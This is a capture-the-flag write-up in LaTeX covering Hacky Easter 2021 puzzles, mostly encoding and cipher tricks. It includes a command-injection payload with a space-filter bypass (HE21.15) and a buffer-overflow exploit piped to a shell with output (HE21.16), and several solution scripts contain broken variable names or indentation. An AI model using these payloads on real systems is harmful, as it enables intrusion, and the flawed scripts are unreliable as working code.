\documentclass[english,a4paper,nols,noindent]{tufte-handout}
\usepackage[english]{babel}
%\usepackage{longtable}
%\usepackage{lscape}
\usepackage{graphicx}
\usepackage{minted}
\usepackage{booktabs}
\usepackage{listings}
\usepackage{fancyvrb}
\usepackage{fvextra}
\usepackage{enumitem}
\setlist{nolistsep}
%\setlist{nosep}
%\usepackage{harfload}
%\usepackage{latexsym}
%\usepackage[square]{natbib}
%\usepackage{fontspec}
%\setmainfont{Linux Libertine O}% or Minion Pro or what have you
%\parindent=0pt
%\special{papersize=210mm,297mm}%
% Set up the spacing using fontspec features
\renewcommand\allcapsspacing[1]{{\addfontfeature{LetterSpace=15}#1}}
\renewcommand\smallcapsspacing[1]{{\addfontfeature{LetterSpace=10}#1}}


\title{Hacky Easter 2020 write-up}
\author{brp64}
\date{2021-05-31}

\begin{document}

\maketitle

  
\hypertarget{he21.-1}{%
  \section{HE21.(-1) Teaser Challenge}
  \label{sec:HE21.-1}}

\begin{marginfigure}
  \includegraphics[width=50mm]{images/banner.jpg}
\end{marginfigure}
Ed wrote you a letter containing strange symbols: 
\verb+;85)8( )‡0¶8† -‡*3(5;)+
Can you recover the message?


\hypertarget{HE21.-1}{%
\subsection{HE21.(-1) Solution}\label{he21.-1}}
The image of E. A. Poe directs us towards his cryptography claims,
mainly that he could solve any substitution cipher.  With some guess
work using ``teaser'' as a crib for the first word, we quickly find
the solution \verb+teaser solved congrats+

An alternate approach is to investigate his book ``The golden bug''
where this substitution cipher is taken from.

\hypertarget{HE21.01-first-egg}{%
\section{HE21.01 First egg}\label{HE21.01-first-egg}}

\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge1.jpg}
\end{marginfigure}
\subsection{Intro}
Well, this is not a real challenge yet, just a quick intro. Some would say sanity check.

\subsection{Event}

\begin{itemize}
  \item The event runs until May 13, 13:37 CET.
  \item Please do not publish write-ups, before that.
  \item There's a Discord server, in case you need support.
\end{itemize}

\subsection{Challenges}

\begin{itemize}
  \item Challenges have difficulty noob, easy, medium, or hard.
  \item Some challenges have a hint - opening the hint is free.
\end{itemize}

\subsection{Flags}

\begin{itemize}
  \item Flag format: \verb+he2021{just_4n_3x4mpl3}+.
  \item There are no flags / eggs hidden in the application - please do not attack it.
\end{itemize}

\subsection{Levels}

\begin{itemize}
  \item With a certain amount of points scored in the current level, you level up.
  \item You can always go back to earlier levels.
  \item That's it for now. Check the HowTo for more details.
\end{itemize}

Time to catch the first flag now! Download the image below.
\begin{marginfigure}
    \includegraphics[width=50mm]{ch01/first_egg.png}
%\caption{day01/card.png}
\end{marginfigure}

\hypertarget{he21.01-solution}{%
\subsection{HE21.01 Solution}\label{he21.01-solution}}

Just read the flag backwards.

\hypertarget{he21.02}{%
\section{HE21.02 Basement Cat}\label{he21.02}}

\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge2.jpg}
\end{marginfigure}
Hi, me iz <strong>Base</strong>ment Cat!

Here iz flag: \verb+5jsnZDgv9EfFeoGXZrFurdz7MWAnK2WaPfszFadr+

\subsection{Show hint (free)}
The number on the image, is a hint! 😉

Check out Cyber Chef.

\hypertarget{he21.02-solution}{%
\subsection{HE21.02 Solution}\label{he21.02-solution}}

The text is base58 encoded, using Cyber Chef it can be converted to
the flag \verb+he2021{meow_nice_to_meet_you}+.

\hypertarget{he21.03}{%
\section{HE21.03 Easy One}\label{he21.03}}

\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge3.jpg}
\end{marginfigure}

\noindent How did this happen? This was suppossed to be a
valid QR code, but some ants walked across it. Can you repair the
damage?

\begin{marginfigure}
    \includegraphics[width=50mm]{ch03/easyone.png}
\end{marginfigure}

\hypertarget{he21.03-solution}{%
\subsection{HE21.03 Solution}\label{he21.03-solution}}

\noindent The file just contains the outline of the QR-code, one line
of pixels is all blacked out, so a fill will have the white bleed into
areas that should be black.  Use Gimp to correct the interrupted white
lines and then start filling with white where appropriate.

\begin{marginfigure}
    \includegraphics[width=50mm]{ch03/easyone_solved.png}
\end{marginfigure}

\hypertarget{he21.04}{%
  \section{HE21.04 Beehive}
  \label{he21.04}}
% \section{HE21.04 Beehive}

\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge4.jpg}
\end{marginfigure}


\noindent There's a secret code in the beehive.

⚑ format: he2021{flaglower}.

Lowercase only, and no spaces!
\subsection{Hints}
Kim Godgul

\begin{marginfigure}
    \includegraphics[width=50mm]{ch04/beehive.png}
\end{marginfigure}


\hypertarget{he21.04-solution}{%
\subsection{HE21.04 Solution}\label{he21.04-solution}}

\noindent The hint points us towards some alphabets introduced by Kim
Godgul and we find the
\url{https://omniglot.com/conscripts/colorhoney.php} that shows the
ColorHoney alphabet.  With this we get the flag \verb+he2021{busybee}+

\hypertarget{he21.05}{%
\section{HE21.05 Unicorn}\label{he21.05}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge5.jpg}
\end{marginfigure}

\noindent 🦄 Ain't no CTF without a unicorn! 🦄

\begin{verbatim}
s7GvyM1RKEstKs7Mz7NVMtQzUFJIzUvO  
T8nMS7dVCg1x07VQsrfj5bJJzs9LL0os  
KQayFRRs0nIS0+0yUo0MjAyrS/MMkw2K  
8uIN84CiJcbGximKtTb6YBVAffpwjQA=  
\end{verbatim}

\subsection{Show Hint (free)}
Decode and inflate!

\hypertarget{he21.05-solution}{%
\subsection{HE21.05 Solution}\label{he21.05-solution}}

The flag seems to be base64 encoded, so head over to Cyber Chef, but
the result does not resemble anything sensible. So look at the hint
and try to inflate the result and get:

\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<congrats>
  <flag>he2021{un1c0rn_1nflat333d!}</flag>
</congrats>
\end{verbatim}

\hypertarget{he21.06}{%
  \section{HE21.06 Mystical Symbols}
  \label{he21.06}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge6.jpg}
\end{marginfigure}

\noindent I found these mystical symbols.

\noindent What do they mean?

\subsection{Show Hint (free)}
\begin{itemize}
\item Really \textbf{myst}ical, isn't it?
\item decimal to ascii
\end{itemize}

\begin{figure}
    \includegraphics[width=150mm]{ch06/symbols.png}
\end{figure}


\hypertarget{he21.06-solution}{%
\subsection{HE21.06 Solution}\label{he21.06-solution}}

\noindent The symbols looked very familiar, but we could not figure
out where they came from.  The hint then made it clear: the game Myst.
A quick websearch finds
\url{https://dni.fandom.com/wiki/Di\%27ni_Numerals}, which allows us
to translate the symbols into integers: 83, 49, 114, 114, 117, 122

These integers correspond to the ASCII string ``S1rruz'', or the flag \verb+he2021{S1rruz}+.

\hypertarget{he21.07}{%
\section{HE21.07 Caesar's Meme}\label{he21.07}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge7.jpg}
\end{marginfigure}

\noindent As is only little known, the ancient Romans invented the memes.

\begin{marginfigure}
    \includegraphics[width=50mm]{ch07/caesarsmeme.jpg}
\end{marginfigure}

\hypertarget{he21.07-solution}{%
\subsection{HE21.07 Solution}\label{he21.07-solution}}

Caesar points towards Ceasar chiffre, so transcribe the text

\verb+RQH GRHV QRW VLPSOB JHW WKLV IODJ: kh2021{lpshudwru}+

into Cyber Chef and play around with the rot parameter.  For a shift
of 23 we get the flag

\verb+ONE DOES NOT SIMPLY GET THIS FLAG: he2021{imperator}+.

\hypertarget{he21.08}{%
\section{HE21.08 Sunshine}\label{he21.08}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge8.jpg}
\end{marginfigure}

\noindent The rays of sunshine are right there, in front of your eyes.

\begin{marginfigure}
    \includegraphics[width=50mm]{ch08/sunshine.png}
\end{marginfigure}

\hypertarget{he21.08-solution}{%
\subsection{HE21.08 Solution}\label{he21.08-solution}}

Use scissors and a steady hand to glue the strips back together. Or find a suitable tool...

\verb+he2021{0h_h3llo_sunsh1ne!}+
\begin{marginfigure}
    \includegraphics[width=50mm]{ch08/solution08.jpg}
\end{marginfigure}

\hypertarget{he21.09}{%
\section{HE21.09 Cafe Shop}\label{he21.09}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge9.jpg}
\end{marginfigure}

\noindent They have good things at the cafe shop, but I want a COLA - DECAF it must be!

Visit the shop here:
\url{http://46.101.107.117:2104}

Note: The service is restarted every hour at x:00.

\subsection{Show Hint (free)}
\begin{itemize}
\item They also serve hash browns, for \$256.
\end{itemize}

\hypertarget{he21.09-solution}{%
\subsection{HE21.09 Solution}\label{he21.09-solution}}

This took some time to solve.

The hint points towards the use of a hash function, probably of 256 bit length.
After some playing around, we found that the order always consists of an eight
digit number and a string, possibly of two words.  The words in all capitals in
the order correspond to the name of the png-file shown with the order.

A brute forcer to find all accepted solutions for "Vanilla Cafe" found many
solutions, but for all three pictures.  Playing a bit more around with the
order strings in Cyber Chef and searching for \verb+0xcafe+ showed that all
accepted orders contained the sub-string \verb+cafe+ in the SHA256 of the full
order string.  So the problem can be solved with brute force:

\begin{minted}{python}
import hashlib
import re

colaDecafRe = re.compile(r'^.*(c01a)*(decaf).*$')

def hash(text):
    m = hashlib.sha256()
    m.update(text)
    return m.hexdigest()

for i in range(10000000,100000000):
    s = b'%d Cola Decaf' % i
    h = hash(s)
    g = colaRe.search(h)
    if g and decafRe.search(h):
        print('found match for s: %s' % s)
        print(h)
\end{minted}

The script prints out the solutions
\begin{verbatim}
'19614073 Cola Decaf'
'96787682 Cola Decaf'
\end{verbatim}

When sent to the order site using Postman, the order is acknowledged and the
egg is displayed.

\begin{marginfigure}
    \includegraphics[width=50mm]{ch09/7ef384aa6ec128ef.png}
\end{marginfigure}


\hypertarget{he21.10}{%
\section{HE21.10 Ghost in a Shell 1}\label{he21.10}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge10.jpg}
\end{marginfigure}

\begin{verbatim}
  _, _,_  _,  _, ___   _ _, _    _,    _, _,_ __, _,  _,    ,  
 / _ |_| / \ (_   |    | |\ |   /_\   (_  |_| |_  |   |     |  
 \ / | | \ / , )  |    | | \|   | |   , ) | | |   | , | ,   |  
  ~  ~ ~  ~   ~   ~    ~ ~  ~   ~ ~    ~  ~ ~ ~~~ ~~~ ~~~   ~  
______________________________________________________________________  
 ,--.    
| oo |   
| ~~ |   o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  
|/\/\|   
______________________________________________________________________  
\end{verbatim}
Connect to the server, snoop around, and find the flag!

\begin{itemize}
\item \verb+ssh 46.101.107.117 -p 2106 -l inky+
\item password is: \verb+mucky_4444+
\end{itemize}
Note: The service is restarted every hour at x:00.

\hypertarget{he21.10-solution}{%
\subsection{HE21.10 Solution}\label{he21.10-solution}}

Log into the service to find a bunch of files describing the game of
pac-man.  There are two subdirectories, one named ``images'' with a
bunch of pictures, one named ``texts'' with some descriptions of the
adversaries.  Hidden in ``images'' is also a directory named ``...'',
containing a file ``...''.  this file can be copied to the local host
and contains the flag:

\begin{marginfigure}
    \includegraphics[width=50mm]{ch10/hidden.png}
\end{marginfigure}
\verb+he2021{h1dd3n_d0td0td0t!}+.

\hypertarget{he21.11}{%
\section{HE21.11 Hidden}\label{he21.11}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge11.jpg}
\end{marginfigure}

I swear I had the flag a minute ago, but now it seems to be hidden somewhere...

Go back to level 3 and analyze the files of the challenges again. If
you look hard enough, you can find an additional flag.

\subsection{Show Hint (free)}
\begin{itemize}
\item The \textbf{sol}ution is hidden in an image. It's hidden in the
  \textbf{file content}, not in the image (no steganography).
\item There are some numbers in the flag: \verb+he2021{☐☐0☐☐☐☐☐☐☐☐☐☐☐0☐☐☐3☐☐☐☐☐5☐}+
\end{itemize}

\hypertarget{he21.11-solution}{%
\subsection{HE21.11 Solution}\label{he21.11-solution}}
Look into the files of level three. There is one -- sunshine.png --
that matches the hint (in retrospect it is clear what was meant...).
At the end of this PNG file is some ASCII text appended (2800
characters).  If line breaks are inserted every 16 characters, this
pattern emerges:

\begin{verbatim}
0  _              
1 | |__           
2 | '_ \          
3 | | | |         
4 |_| |_|         
5   ___           
6  / _ \          
7 |  __/          
8  \___|          
9  ____           
10 |___ \          
11   __) |         
12  / __/          
13 |_____|         
14   ___           
15  / _ \          
16 | | | |         
17 | |_| |         
18  \___/          
19  ____           
20 |___ \          
21   __) |         
22  / __/          
23 |_____|         
24  _              
25 / |             
26 | |             
27 | |             
28 |_|             
29
\end{verbatim}

Properly transcribed, this gives the flag \verb+he2021{Wh0_is_scared_0f_h3xdump5?}+

And in fact, opening the characters in hexl-mode in Emacs, shows the pattern right away...


\hypertarget{he21.12}{%
\section{HE21.12 Ansi Art}\label{he21.12}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge12.jpg}
\end{marginfigure}

Hope you like my ansi art egg!

Get it with \verb+nc 46.101.107.117 2105+

Note: The service is restarted every hour at x:00.

\hypertarget{he21.12-solution}{%
\subsection{HE21.12 Solution}\label{he21.12-solution}}

Logging into the service spews out a picture of an egg, but with no
writing.  Dumping the output into a file shows that it contains mostly
ANSI terminal control sequences.  Poking around, we find that if we
seach for the letter ``h'', we find a sequence ending with ``h'', then
a sequence ending with ``e'', so this is probably the flag.  Manually
stripping out the control sequences, we get the flag
\verb+he2021{4Ns1MG1k}+


\hypertarget{he21.13}{%
  \section{HE21.13 No No No}
  \label{he21.13}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge13.jpg}
\end{marginfigure}

\noindent No! No... nono ..

Where's the egg???

\subsection{Show Hint (free)}
\begin{itemize}
\item Using a tool might be a good idea here.
\item There is a small glitch - if you don't get a solution, try something else.
\end{itemize}

\begin{marginfigure}
    \includegraphics[width=50mm]{ch13/nonobunnygram.png}
\end{marginfigure}


\hypertarget{he21.13-solution}{%
\subsection{HE21.13 Solution}\label{he21.13-solution}}

\noindent The picture shows a nomogram and online there are many
solvers.  We used \url{http://a.teall.info/nonogram}, reading off the
numbers by hand.  The solver does not find a complete solution, but
the error correction of the QR-code is good enough to allow the flag
to be read.

\verb+he2021{Y3sY3sY3sgram_s0unds_a_l0t_nic3r}+.
\begin{figure}
    \includegraphics[width=150mm]{ch13/solution13.png}
\end{figure}

\hypertarget{he21.14}{%
  \section{HE21.14 Haxxor what?}
  \label{he21.14}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge14.jpg}
\end{marginfigure}

\noindent I got this image of an Easter egg.

But what kind of encryption is this?!

\subsection{Show Hint (free)}
\begin{itemize}
\item The original file is an image
\end{itemize}


\hypertarget{he21.14-solution}{%
\subsection{HE21.14 Solution}\label{he21.14-solution}}

\noindent The file is a binary file, from the hint and the title we assume that it is XOR'ed with a constant key.  Assuming a PNG file, we can use the first few bytes as a crypt and get the key:
\begin{itemize}
\item See \url{http://libpng.org/pub/png/spec/1.2/PNG-Structure.html} for the file signature (decimal): 137 80 78 71 13 10 26 10
  
\item Use Cyber Chef to XOR this signature with the file to get this key: \verb+haxxors!+
\end{itemize}

Then XOR the file using \verb+xortools-xor+

\begin{verbatim}
% xortool-xor -r 'haxxors!' -f haxxorwhat  >output.png 
\end{verbatim}

to get the egg and the flag
\verb+he2021{r34l_x0r_h4xx0r}+.
\begin{marginfigure}
    \includegraphics[width=50mm]{ch14/output.png}
\end{marginfigure}

\hypertarget{he21.15}{%
  \section{HE21.15 Social Checker}
  \label{he21.15}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge15.jpg}
\end{marginfigure}

\noindent Social Checker - check if your favourite social media site is online!

\url{http://46.101.107.117:2103}

Note: The service is restarted every hour at x:00.

\subsection{Show Hint (free)}
\begin{itemize}
\item Some characters are blocked - find a workaround!
\end{itemize}

\hypertarget{he21.15-solution}{%
\subsection{HE21.15 Solution}\label{he21.15-solution}}

\noindent The application lets us choose a web-site from a list and tells us if
it can ping it.  So let's try to test our own sites by injecting our data into
the \verb+url+ form parameter.

Looking for \verb+twitter$.com+ shows \verb+nc: bad address 'twitter$.com'+.
So the value is sent to nc and it reflects it to us.  Try to inject some data
into the call \verb+$(ls /)+, but this is rejected 
\verb+nice try - www.youtube.com/watch?v=a4eav7dFvc8+. However, we
resist the urge to click on this url.

Interestingly, \verb+$(ls)+ gives us the help screen for \verb+nc+.  So the url
is passed on to \verb+nc+ and it is interpreted before by the shell.  So let us
interpret the output of \verb+ls+ as a string (\verb+"$(ls)"+)and see what it
does:
\begin{verbatim}
nc: bad address 'bg.jpg
check.php
flag.txt
index.php'
\end{verbatim}

There is a file \verb+flag.txt+ in the directory, so we can show its contents
with \verb+"$(cat${IFS}flag.txt)"+.  The IFS is necessary to bypass the
detection of spaces.  And we get the flag

\begin{verbatim}
nc: bad address 'he2021{1ts_fun_t0_1nj3kt_k0mmand5}'
\end{verbatim}

\hypertarget{he21.16}{%
  \section{HE21.16 LOTL}
  \label{he21.16}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge16.jpg}
\end{marginfigure}

\noindent Save the planet!

Well, we should then better LOTL and use what we have, right?

\verb+nc 46.101.107.117 2102+

Get a shell and read the flag.

Note: The service is restarted every hour at x:00.

Executable ``lotl'' is provided.

\hypertarget{he21.16-solution}{%
\subsection{HE21.16 Solution}\label{he21.16-solution}}

\noindent The provided executable can be analysed using Ghidra and shows a main
function with a classic buffer overflow problem from using \verb+gets+:

\begin{minted}{c}
undefined8 main(void)
{
  char pwn_me [32];
  
  ignore_me_init_buffering();
  ignore_me_init_signal();
  printf("Welcome! Please give me your name!\n> ");
  gets(pwn_me);
  printf("Hi %s, nice to meet you!\n",pwn_me);
  return 0;
}
\end{minted} 

So we can to overflow the buffer and jump to a proper place to get us a shell.

Really interesting is the function \verb+profit+ at address \verb+0x0040086d+
\begin{minted}{c}
void profit(void)
{
  system("/bin/sh");
  return;
}
\end{minted}

So it should be easy to construct the payload: load 32 bytes for the buffer, 8
bytes for the RBP and then 8 bytes for the RIP.  However, this does not work.
In the end, it turns out that the binary did not match the challenge and only a
padding of 32 bytes was needed:

\begin{verbatim} 
printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDD\x6d\x08\x40\x00\x00\x00\x00\x00\nls -l\ncat flag\n" |
nc 46.101.107.117 2102
Welcome! Please give me your name!
> Hi AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDD@, nice to meet you!
total 36
-rwxrwxr-x 1 root root  8848 Mar  2 18:30 challenge1
-rw-rw-r-- 1 root root    40 Mar  2 18:30 flag
-rwxrwxr-x 1 root root 18744 Mar  2 18:30 ynetd
he2021{w3ll_th4t_w4s_4_s1mpl3_p4yl04d}
\end{verbatim} 

The flag is \verb+he2021{w3ll_th4t_w4s_4_s1mpl3_p4yl04d}+


\hypertarget{he21.17}{%
  \section{HE21.17 Digizzled}
  \label{he21.17}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge17.jpg}
\end{marginfigure}

\noindent Had a flag, but it got digizzled. Can you recover it?

\begin{verbatim}
-------------------------------------  
      o                  o             
      | o      o         |             
    o-O   o--o   o-o o-o | o-o o-o     
   |  | | |  | |  /   /  | |-' |       
    o-o | o--O | o-o o-o o o-o o       
             |                         
         o--o                          
-------------------------------------
enter flag: [REDACTED]    
digizzling...  
c5ab05ca73f205ca  
\end{verbatim}

A file ``digizzle'' is given.

\hypertarget{he21.17-solution}{%
\subsection{HE21.17 Solution}\label{he21.17-solution}}

\noindent The file is a dump of disassembled python code; check the
documentation on the module \verb+dis+.  If python 3.7 is used, the
disassembly can be reproduced by this code:

\begin{minted}{python}
import re
pattern = re.compile('^he2021\\{([dlsz134]){9}\\}$')

def hizzle(s):
    s1 = 13
    s2 = 37
    for n in range(len(s)):
        s1 = (s1 + ord(s[n])) % 65521
        s2 = (s1 * s2) % 65521
    return (s2 << 16) | s1

def smizzle (a,b):
    return format(a, 'x') + format(b, 'x')

print('-------------------------------------')
print('      o                  o           ')
print('      | o      o         |           ')
print('    o-O   o--o   o-o o-o | o-o o-o   ')
print("   |  | | |  | |  /   /  | |-' |     ")
print('    o-o | o--O | o-o o-o o o-o o     ')
print('             |                       ')
print('         o--o                        ')
print('-------------------------------------')
s = input('enter flag:')
res = pattern.match(s)
if res:
    print('digizzling...')
    a = hizzle(s)
    b = hizzle(s[::-1])

    print(smizzle(a,b))

else:
    print('wrong format!')  
  \end{minted}

  We know the expected result for the flag and build a brute forcing
  loop.  Since the function \verb+smizzle+ does only a conversion from
  integer to string and then a string concatenation, we can leave it
  away and compare directly with integers.

  \begin{minted}{python}
    alph = 'dlsz134'
    
    for c1 in alph:
    for c2 in alph:
    print(c2)
    for c3 in alph:
            for c4 in alph:
                for c5 in alph:
                    for c6 in alph:
                        for c7 in alph:
                            for c8 in alph:
                                for c9 in alph:
                                    s = 'he2021{' + c1 + c2 + c3+ c4 + c5 + c6+ c7 + c8 + c9 + '}'
                                    a = hizzle(s)
                                    if a == 0xc5ab05ca:
                                        b = hizzle(s[::-1])
                                        if b == 0x73f205ca:
                                            print(s)
                                            print(smizzle(a,b))
                                            sys.exit(0)
  
  \end{minted}

The flag is \verb+he2021{d1s4zzl3d}+

\hypertarget{he21.18}{%
  \section{HE21.18 Bunny Beat}
  \label{he21.18}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge18.jpg}
\end{marginfigure}

\noindent The bunnies have discovered minimal beats!

But where is the flag?

Wave file \verb+bunnybeat.wav+ is given.

\hypertarget{he21.18-solution}{%
\subsection{HE21.18 Solution}\label{he21.18-solution}}

\noindent Look at the wave file in Sonic Visualiser and check out the
spectrogram.  Then the flag stands out immediately
\verb+he2021{Sp3ctrogramsROCK!}+.

\begin{marginfigure}
    \includegraphics[width=50mm]{ch18/spectrogram.png}
\end{marginfigure}


\hypertarget{he21.19}{%
  \section{HE21.19 😈}
  \label{he21.19}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge19.jpg}
\end{marginfigure}

\noindent One of the bunnies made a new friend. But when asked for the name, he only got the response below.

Can you find out the friend's name, in UPPERCASE?

\begin{verbatim*}
▫️▫️😈😈▫️▫️▫️😈▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️😈😈▫️▫️▫️😈😈▫️😈😈▫️▫️▫️😈😈▫️😈😈▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️▫️▫️▫️😈😈▫️▫️▫️😈
\end{verbatim*}

⚑ format: \verb+he2021{JOHNDOE}+

\subsection{Show Hint (free)}
\begin{itemize}
\item We need the name of what you find, in UPPERCASE, and wrapped in he2021{...}.
\end{itemize}


\hypertarget{he21.19-solution}{%
\subsection{HE21.19 Solution}\label{he21.19-solution}}

\noindent This was supposed to be easy, but it took us longer than
many others so far.  The input string contains two symbols that can be
translated to a binary representation and, when chopped into 8 bit
pieces, interpreted as characters.  This gives us a string
\verb+1000000000000066600000000000001+.  After many futile attempts,
we found that it is called ``Belphegor's prime'' and so the flag is
\verb+he2021{BELPHEGOR}+.

\hypertarget{he21.20}{%
  \section{HE21.20 Run Me, Baby!}
  \label{he21.20}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge20.jpg}
\end{marginfigure}

\noindent This one's easy, ain't it? Just run the .class file. Hope you like Java!

Class file \verb+runme.class+ is given.

\hypertarget{he21.20-solution}{%
\subsection{HE21.20 Solution}\label{he21.20-solution}}

\noindent The class file is not from a Java program, but from a Groovy
program.  Decompiling the class file using cfr gave a quite convoluted
java file.  Since the challenge is labelled as easy, we tried to run
the Groogy program directly.  But when we failed, we quickly re-wrote
it in python to get the flag \verb+he2021{isnt_17_gr00vy_baby?}+

\begin{minted}{python}
s = [1, 6, 7, 3, 2, 9, 4, 5, 3, 4, 8, 9, 1, 7, 3, 2, 3, 3, 7, 8, 7, 3, 2, 4, 5, 3, 5, 1, 3, 0, 3, 4, 5, 5]
cipher = "ik934:\u007fnvr|h2>biu37~\u0080bdeg|D~"
sol = ''

for i in range(len(cipher)):
    t = ord(cipher[i]) - s[i]
    sol += chr(t)
print(sol)
\end{minted}

\hypertarget{he21.21}{%
  \section{HE21.21 Memeory 3.0 -- The Finale}
  \label{he21.21}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge21.jpg}
\end{marginfigure}

\noindent We finally fixed Memeory 2.0 and proudly release Memeory 3.0 aka the supersecure-Memeory.

Flagbounty for everyone who can solve 10 successive rounds. Time per round is 30 seconds and only 3 missclicks are allowed.

\url{http://46.101.107.117:2107}

Note: The service is restarted every hour at x:00.
Class file \verb+runme.class+ is given.

\hypertarget{he21.21-solution}{%
\subsection{HE21.21 Solution}\label{he21.21-solution}}

\noindent This is an extension of an older challenge: play memory on-line.  The
path to solve it remains the same: load all images (labelled from 1 to 98),
identify which ones are the same and the post the proper pairs.  Compared to
the last installment, the images can be rotated and so we have to identify
them.  This is a similar task as in HackyEaster 2019, 'Egg CAPTCHA'.  Basically
write some code to compare all possible orientation of a picture with another
picture and calculate a figure of merit.  I chose an rms distance and this
worked well:

\begin{minted}{python}
import requests
import numpy as np
from PIL import Image


def mse(im1_arr, im2_arr):
    #diff = im1_arr - im2_arr
    err = np.sum((im1_arr - im2_arr) ** 2)
    err /= float(im1_arr.shape[0])
    return 3.0*err

def match(im1_arr, im2_arrs):
    rms = np.empty(4, dtype=np.float)
    for i in range(4):
        rms[i] = mse(im1_arr, im2_arrs[i])
    avg = np.sum(rms) / 4.0
    rms2 = np.true_divide(rms, avg)
    return (np.max(rms2) - np.min(rms2))

def match_with(im, im2, thresh):
    (sX,sY) = im.size
    arrlen = sX*sY*3
    (sX2,sY2) = im2.size

    if sX == sX2 and sX == sY2 and sX == sY:
        # build an array with all rotated images as arrays
        im_arrs = []
        for i in range(4):
            im_arrs.append(np.array(im, dtype=np.float).reshape((arrlen)))
            if i < 3:
                im = im.rotate(90)
        im_arr2 = np.array(im2, dtype=np.float).reshape((arrlen))
        m = match(im_arr2,im_arrs)
        if m > thresh:
            return True
    else:
        if sX == sX2 and sY == sY2:
            return True
        elif sX == sY2 and sY == sX2:
            return True
        else:
            return False
    return False
\end{minted}

The code is straight-forward, the only issue was with images that are not
square: these cannot be dealt with so easily; for now we just assume that they
are the same, if the dimensions are compatible.

Solving the challenge is then relatively easy:
\begin{minted}{python}
base_url = "http://46.101.107.117:2107/"
def getPics(s):
    pics = {}
    for i in range(1,99):
        u = base_url+'pic/%d'%i
        r = s.get(u)
        with io.BytesIO(r.content) as imgF:
            img = Image.open(imgF)
            img.load()
            pics[i] = img
    return(pics)


def runMatch(session, pics, found, thresh):
    solve_url = base_url+'solve'
    post_data = {'first': '1', 'second': '2'}
    for i in range(1,99):
        if not found[i]:
            for j in range(i+1, 99):
                if not found[j]:
                    try:
                        if match_with(pics[i], pics[j], thresh):
                            post_data['first'] = i
                            post_data['second'] = j
                            r = session.post(solve_url, post_data)
                            if r.text[:2] != 'ok' and r.text != 'nextRound':
                                raise ValueError
                            # print('pics %d and %d match!' %(i,j))
                            found[i] = True
                            found[j] = True
                            break
                    except ValueError:
                        print(i,j)
                        print(pics[i].size, pics[j].size)
                        print(r.text)
                        # pics[i].show()
                        # pics[j].show()
                        pass

    nNotFound = 0
    for v in found:
        if not v:
            nNotFound += 1
    return r.text, session, found, nNotFound

def solveRound(session):
    r = session.get(base_url)
    pics = getPics(session)
    found = [False for i in range(99)]
    found[0] = True
    nNotFound = 98
    thresh = 0.9

    while nNotFound > 0:
        result, session, found, nNotFound = \
            runMatch(session, pics, found, thresh)
        print(result, nNotFound, thresh)
        thresh -= 0.1
    return result


def solve():
    count = 0
    ok = 'nextRound'
    res = ok
    session = requests.session()
    while res == ok:
        count += 1
        print('round: ', count)
        res = solveRound(session)
        print(res)


solve()
\end{minted} 

In the end we get the result
\verb+ok, here is your flag: he2021{0k-1-5u44end3r-y0u-w1n!}+
and the flag \verb+he2021{isnt_17_gr00vy_baby?}+


\hypertarget{he21.22}{%
  \section{HE21.22 46 Apes}
  \label{he21.22}}
\begin{marginfigure}
    \includegraphics[width=50mm]{images/challenge22.jpg}
\end{marginfigure}

\noindent 46 apes encoded a message for you:

\verb+2Qu93ZhJHdsMGIlhmcgUXagMWe19icmBGbnFiOoBTZwIjM7FGd0gHdfNTbuB2a5V2X1JzcuF3MzNQf==+

\hypertarget{he21.22-solution}{%
\subsection{HE21.22 Solution}\label{he21.22-solution}}

\noindent First thought: it looks like base64 encoded, but this yields a binary.  But ``46 Apes'' could mean to reverse the string, except for the padding.  So head over to Cyber Chef and try: \verb+}.s3qns2u_eyk`nm3_tx4ta{220e0h:!gl`fr/uyc iu rhe c,trag.nC+. This looks much better, as it is all printable characters and it is kind of reversed.  The last word is probably ``Congrats'', so see what is up:

\begin{verbatim}
>>> base64.b64encode(b'Congrats')
b'Q29uZ3JhdHM='
\end{verbatim}

It looks like the original message was just reversed in packets of two:
original is \verb+2Qu93Z+, correct would be \verb+Q29uZ3+.

